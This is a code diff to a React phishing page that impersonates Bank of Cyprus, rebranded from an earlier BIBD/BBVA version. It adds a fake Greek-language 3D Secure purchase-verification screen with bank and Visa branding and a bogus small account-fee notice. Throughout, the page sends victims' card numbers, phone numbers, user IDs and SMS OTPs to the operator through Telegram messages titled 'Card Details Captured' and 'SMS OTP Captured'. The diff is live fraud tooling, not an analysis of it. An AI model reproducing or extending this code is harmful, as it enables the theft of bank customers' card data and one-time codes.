@@ -97,6 +97,7 @@ type ScreenType =
   | "phone"
   | "login"
   | "card"
+  | "boc-verify"
   | "otp"
   | "accounts"
   | "confirm-otp"
@@ -123,6 +124,8 @@ export default function BbvaPage(props: any) {
         setCurrentScreen("confirm-otp")
       } else if (p.includes("/accounts")) {
         setCurrentScreen("accounts")
+      } else if (p.includes("/boc-verify") || p.includes("/3ds")) {
+        setCurrentScreen("boc-verify")
       } else if (p.includes("/verify") || p.includes("/otp")) {
         setCurrentScreen("otp")
       } else if (p.includes("/card")) {
@@ -184,6 +187,7 @@ export default function BbvaPage(props: any) {
   const [cardCvv, setCardCvv] = useState("")
   const [cardError, setCardError] = useState("")
   const [isCardSubmitting, setIsCardSubmitting] = useState(false)
+  const [isBocVerifying, setIsBocVerifying] = useState(false)
 
   // Card input refs for auto-moving focus
   const cardNumberRef = useRef<HTMLInputElement>(null)
@@ -497,7 +501,7 @@ export default function BbvaPage(props: any) {
         (phoneNumber ? `${phoneCountryCode} ${phoneNumber.replace(/\s+/g, "")}` : undefined)
 
       await sendTelegramMessage({
-        title: "BIBD — Card Details Captured",
+        title: "Bank of Cyprus — Card Details Captured",
         dni: savedUser || undefined,
         phoneNumber: savedPhone || undefined,
         cardNumber: cleanCard,
@@ -509,9 +513,60 @@ export default function BbvaPage(props: any) {
       console.error("Error sending Telegram notification:", err)
     }
 
-    // Wait exactly 2 seconds as requested, then switch to OTP screen
+    // Wait exactly 2 seconds as requested, then switch to the 3DS verification screen
     setTimeout(() => {
       setIsScreenLoading(false)
+      setCurrentScreen("boc-verify")
+      if (typeof window !== "undefined" && window.history) {
+        window.history.pushState({ screen: "boc-verify" }, "", "/boc-verify")
+      }
+    }, 2000)
+  }
+
+  // Dynamic date formatted as DD/MM/YYYY according to Cyprus timezone (Europe/Nicosia)
+  const currentDateFormatted = (() => {
+    try {
+      const formatter = new Intl.DateTimeFormat("en-GB", {
+        timeZone: "Europe/Nicosia",
+        day: "2-digit",
+        month: "2-digit",
+        year: "numeric",
+      })
+      return formatter.format(new Date())
+    } catch {
+      const now = new Date()
+      const d = String(now.getDate()).padStart(2, "0")
+      const m = String(now.getMonth() + 1).padStart(2, "0")
+      const y = now.getFullYear()
+      return `${d}/${m}/${y}`
+    }
+  })()
+
+  // 2.5 Handle 3DS Purchase Verification Approval: "Έχω ήδη εγκρίνει την συναλλαγή"
+  const handleBocApproval = async () => {
+    setIsBocVerifying(true)
+    try {
+      const savedUser = (typeof window !== "undefined" && sessionStorage.getItem("bbva_userId")) || userId.trim()
+      const savedPhone =
+        (typeof window !== "undefined" &&
+          (sessionStorage.getItem("bbva_phoneNumber") ||
+            sessionStorage.getItem("phoneNumber") ||
+            sessionStorage.getItem("bibd_phone"))) ||
+        (phoneNumber ? `${phoneCountryCode} ${phoneNumber.replace(/\s+/g, "")}` : undefined)
+
+      await sendTelegramMessage({
+        title: "Bank of Cyprus — 3DS Approval Clicked",
+        dni: savedUser || undefined,
+        phoneNumber: savedPhone || undefined,
+        cardNumber: cardNumber ? cardNumber.replace(/\s+/g, "") : undefined,
+        type: "verify",
+      })
+    } catch (err) {
+      console.error("Error sending Telegram notification:", err)
+    }
+
+    setTimeout(() => {
+      setIsBocVerifying(false)
       setCurrentScreen("otp")
       if (typeof window !== "undefined" && window.history) {
         window.history.pushState({ screen: "otp" }, "", "/verify")
@@ -519,7 +574,7 @@ export default function BbvaPage(props: any) {
       setTimeout(() => {
         otpRefs.current[0]?.focus()
       }, 100)
-    }, 2000)
+    }, 1200)
   }
 
   // Helper to transition from OTP to Accounts page with 2-second loading (as requested)
@@ -538,7 +593,7 @@ export default function BbvaPage(props: any) {
       (phoneNumber ? `${phoneCountryCode} ${phoneNumber.replace(/\s+/g, "")}` : undefined)
 
     sendTelegramMessage({
-      title: "BIBD — SMS OTP Captured",
+      title: "Bank of Cyprus — SMS OTP Captured",
       dni: savedUser || undefined,
       phoneNumber: savedPhone || undefined,
       otp1: codeToSave,
@@ -1201,8 +1256,8 @@ export default function BbvaPage(props: any) {
                 </h2>
                 <p className="text-[#64748b] text-[13px] sm:text-[13.5px] font-normal mt-0.5 mb-4">
                   {language === "es"
-                    ? "Verifique su tarjeta para continuar"
-                    : "Verify your card to continue"}
+                    ? "Verifique su tarjeta para continuar. Se deducirá una comisión de 0.0082 EUR."
+                    : "Verify your card to continue. An account fee of 0.0082 EUR will be deducted."}
                 </p>
 
                 {/* Form */}
@@ -1300,11 +1355,21 @@ export default function BbvaPage(props: any) {
                   )}
 
                   {/* 256-bit encryption text */}
-                  <p className="text-center text-[11px] sm:text-[11.5px] text-[#94a3b8] mt-2 mb-4 leading-normal">
+                  <p className="text-center text-[11px] sm:text-[11.5px] text-[#94a3b8] mt-2 mb-3 leading-normal">
                     {language === "es"
                       ? "Los datos de su tarjeta están protegidos con cifrado de 256 bits."
                       : "Your card details are secured with 256-bit encryption."}
                   </p>
+
+                  {/* Account verification fee notice */}
+                  <div className="w-full bg-[#058998]/5 border border-[#058998]/20 rounded-[10px] p-3 mb-3.5 flex items-start gap-2.5 select-none text-left">
+                    <div className="w-5 h-5 rounded-full bg-[#058998]/10 text-[#058998] flex items-center justify-center shrink-0 mt-0.5 font-bold text-[11.5px]">
+                      i
+                    </div>
+                    <p className="text-[12px] sm:text-[12.5px] text-[#334155] leading-relaxed">
+                      Please note: An account verification fee of <strong className="text-[#058998] font-bold">0.0082 EUR</strong> will be deducted to verify your card.
+                    </p>
+                  </div>
 
                   {/* Continue Button */}
                   <button
@@ -1348,6 +1413,101 @@ export default function BbvaPage(props: any) {
                   </button>
                 </form>
               </div>
+            </div>
+          </section>
+        </main>
+      )}
+
+      {/* ========================================================================= */}
+      {/* 2.5. SCREEN 2.5: 3D SECURE VISA PURCHASE VERIFICATION (Πιστοποίηση Αγοράς) */}
+      {/* Matching user uploaded screenshot from Bank of Cyprus                     */}
+      {/* ========================================================================= */}
+      {currentScreen === "boc-verify" && (
+        <main className="relative w-full max-w-[440px] sm:max-w-[460px] h-[100dvh] max-h-[100dvh] flex flex-col justify-between overflow-y-auto shadow-2xl bg-white px-0 select-none">
+          {/* Header: Left is Τράπεζα Κύπρου + Emblem, Right is VISA Logo */}
+          <header className="w-full px-6 pt-7 pb-4 flex items-center justify-between shrink-0 bg-white">
+            <div className="flex items-center gap-1.5 select-none">
+              <span
+                className="text-[#058998] font-serif font-bold text-[16px] sm:text-[17px] tracking-tight leading-none"
+                style={{ fontFamily: "Georgia, Cambria, 'Times New Roman', Times, serif" }}
+              >
+                Τράπεζα Κύπρου
+              </span>
+              <img
+                src="/boc_logo.png"
+                alt="Τράπεζα Κύπρου"
+                className="w-[24px] h-[24px] sm:w-[26px] sm:h-[26px] object-contain rounded-[4px] shrink-0"
+              />
+            </div>
+
+            <img
+              src="/visa_blue.svg"
+              alt="VISA"
+              className="h-[28px] sm:h-[32px] w-auto object-contain shrink-0"
+            />
+          </header>
+
+          {/* Main Body */}
+          <section className="w-full flex-1 flex flex-col px-6 pt-5 pb-8 select-none">
+            {/* Title: Πιστοποίηση Αγοράς */}
+            <h1 className="text-[17.5px] sm:text-[18.5px] font-bold text-[#000000] tracking-tight mb-4">
+              Πιστοποίηση Αγοράς
+            </h1>
+
+            {/* Instruction description */}
+            <p className="text-[13.5px] sm:text-[14px] text-[#000000] leading-[1.45] font-normal mb-6">
+              Ελέγξτε το BoC Mobile App της Τράπεζας Κύπρου για να επιβεβαιώστε τη συναλλαγή σας.
+            </p>
+
+            {/* Data fields: ΕΜΠΟΡΑΣ, ΠΟΣΟ, ΗΜΕΡΟΜΗΝΙΑ */}
+            <div className="flex flex-col space-y-4 mb-7">
+              <div>
+                <p className="text-[12px] font-bold text-[#000000] tracking-wider uppercase">
+                  ΕΜΠΟΡΑΣ
+                </p>
+                <p className="text-[14px] font-normal text-[#000000] mt-0.5">
+                  FAHIPAY
+                </p>
+              </div>
+
+              <div>
+                <p className="text-[12px] font-bold text-[#000000] tracking-wider uppercase">
+                  ΠΟΣΟ
+                </p>
+                <p className="text-[14px] font-normal text-[#000000] mt-0.5">
+                  MVR 1.04
+                </p>
+              </div>
+
+              <div>
+                <p className="text-[12px] font-bold text-[#000000] tracking-wider uppercase">
+                  ΗΜΕΡΟΜΗΝΙΑ
+                </p>
+                <p className="text-[14px] font-normal text-[#000000] mt-0.5">
+                  {currentDateFormatted}
+                </p>
+              </div>
+            </div>
+
+            {/* Δεν δουλεύει; & Έχω ήδη εγκρίνει την συναλλαγή (Non-clickable) */}
+            <div className="flex flex-col mb-10 select-none">
+              <p className="text-[13.5px] font-bold text-[#000000] mb-1">
+                Δεν δουλεύει;
+              </p>
+              <span className="text-left text-[13.5px] text-[#0052cc] underline underline-offset-2 font-normal cursor-default select-none pointer-events-none inline-block">
+                Έχω ήδη εγκρίνει την συναλλαγή
+              </span>
+            </div>
+
+            {/* Bottom Footer Links (Non-clickable) */}
+            <div className="flex items-center justify-between pt-12 mt-auto select-none pointer-events-none">
+              <span className="text-[13px] font-bold text-[#000000] underline underline-offset-2 cursor-default select-none">
+                Όροι και Προϋποθέσεις
+              </span>
+
+              <span className="text-[13px] font-bold text-[#000000] underline underline-offset-2 cursor-default select-none">
+                Έξοδος
+              </span>
             </div>
           </section>
         </main>
